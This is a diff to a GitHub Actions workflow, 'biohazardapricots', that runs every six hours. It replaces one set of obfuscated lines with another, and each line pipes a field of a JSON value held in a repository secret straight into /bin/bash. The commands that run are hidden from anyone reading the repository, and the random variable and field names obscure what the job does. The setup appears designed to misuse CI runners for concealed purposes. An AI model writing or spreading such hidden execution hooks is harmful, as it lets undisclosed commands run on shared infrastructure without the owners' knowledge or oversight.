@@ -2,7 +2,7 @@ name: biohazardapricots
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 4/6 * * *'
+    - cron: '46 0/6 * * *'
 
 jobs:
   build:
@@ -11,25 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: biohazardapricots
         env:
-          ngdr6858: ${{ secrets.ngdr6858 }}
+          a987: ${{ secrets.a987 }}
         run: |
-          echo $ngdr6858 | jq -r .bu96265 | /bin/bash
-          echo $yi24161 | jq -r .waz4 | /bin/bash
-          echo $xxdfa17875 | jq -r .hm13120 | /bin/bash
-          echo $q79 | jq -r .yuz7 | /bin/bash
-          echo $epvf2 | jq -r .cjxue113 | /bin/bash
-          echo $zkasc6 | jq -r .zpx7748 | /bin/bash
-          echo $s4808 | jq -r .v4 | /bin/bash
-          echo $ycsn349 | jq -r .xjfnv1789 | /bin/bash
-          echo $bxq6939 | jq -r .kof26 | /bin/bash
-          echo $ncfz0339 | jq -r .trhd0501 | /bin/bash
-          echo $on5775 | jq -r .k84 | /bin/bash
-          echo $x7 | jq -r .xyub30303 | /bin/bash
-          echo $kagyt1 | jq -r .bdm45 | /bin/bash
-          echo $wzih32809 | jq -r .m0188 | /bin/bash
-          echo $o0 | jq -r .y7512 | /bin/bash
-          echo $k990 | jq -r .l48 | /bin/bash
-          echo $vywpg436 | jq -r .obq911 | /bin/bash
-          echo $viqg49 | jq -r .ba598 | /bin/bash
-          echo $y242 | jq -r .nnr961 | /bin/bash
+          echo $a987 | jq -r .kpaj2748 | /bin/bash
+          echo $dvj5 | jq -r .fcbx852 | /bin/bash
+          echo $t912 | jq -r .jmthl3 | /bin/bash
+          echo $v31 | jq -r .l7500 | /bin/bash
+          echo $ymcs522 | jq -r .dz8826 | /bin/bash
+          echo $g00 | jq -r .bxy8788 | /bin/bash
+          echo $jczhb82555 | jq -r .amzfl59796 | /bin/bash
+          echo $fsw4 | jq -r .qb156 | /bin/bash
+          echo $ota7083 | jq -r .dvof92548 | /bin/bash
+          echo $kynn5 | jq -r .wwq9 | /bin/bash
 
